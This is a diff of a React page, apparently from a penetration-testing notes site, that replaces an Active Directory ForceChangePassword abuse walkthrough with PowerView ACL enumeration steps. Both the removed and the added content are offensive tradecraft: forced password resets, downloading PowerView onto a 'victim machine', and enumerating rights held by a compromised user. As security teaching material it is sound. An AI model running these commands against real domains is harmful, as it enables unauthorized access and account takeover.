@@ -8,13 +8,12 @@ import {
 import Link from "next/link";
 import SyntaxHighlighter from "react-syntax-highlighter";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import Image from "next/image";
 
 interface IProps {
   title: string;
 }
 
-const ForceChangePassword = ({ title }: IProps) => {
+const ACLEnumeration = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -36,43 +35,44 @@ const ForceChangePassword = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              The members of the compromised group have the capability to change
-              the user's password in the other group without knowing that user's
-              current password.
+              When we compomise an account we can use PowerView.ps1 to enumerate
+              ACLs to identify misconfigurations (This is easier to visualize in
+              BloodHound, but PowerView can be useful as well).
             </Typography>
-            <Image
-              src="/ForceChangePassword.png"
-              width={575}
-              height={154}
-              priority={true}
-            />
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
             <Typography>
-              If you have ForceChangePassword over a group then you can get a
-              list of user's in that group and choose which user we want to
-              change the password for. If you have ForceChangePassword over a
-              user, then skip to step 2.
+              Download PowerView.ps1 and transfer it to the victim machine.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {'Get-ADGroupMember -Identity "OTHER_GROUP_NAME"'}
+              {
+                "wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
+              }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
-            <Typography>Create a new password variable.</Typography>
+            <Typography>Import the PowerView.ps1 module.</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {
-                '$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force'
-              }
+              {"Import-Module .\\PowerView.ps1"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 3</Typography>
             <Typography>
-              Change one of the user's passwords to the password you created.
+              The command below will find all domain objects that our
+              compromised used has rights over by mapping the user's SID to the
+              SecurityIdentifier property which is what tells us who has the
+              given right over an object.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                'Set-ADAccountPassword -Identity "ACCOUNT" -Reset -NewPassword $Password'
+                "Get-DomainObjectACL -ResolveGUIDs -Identity * |? {$_.SecurityIdentifier -eq (Convert-NameToSid {COMPROMISED_USERNAME})}"
+              }
+            </SyntaxHighlighter>
+            <Box sx={{ m: 2 }} />
+            <Typography>Example</Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {
+                "Get-DomainObjectACL -ResolveGUIDs -Identity * |? {$_.SecurityIdentifier -eq (Convert-NameToSid wley)}"
               }
             </SyntaxHighlighter>
           </Typography>
@@ -82,4 +82,4 @@ const ForceChangePassword = ({ title }: IProps) => {
   );
 };
 
-export default ForceChangePassword;
+export default ACLEnumeration;
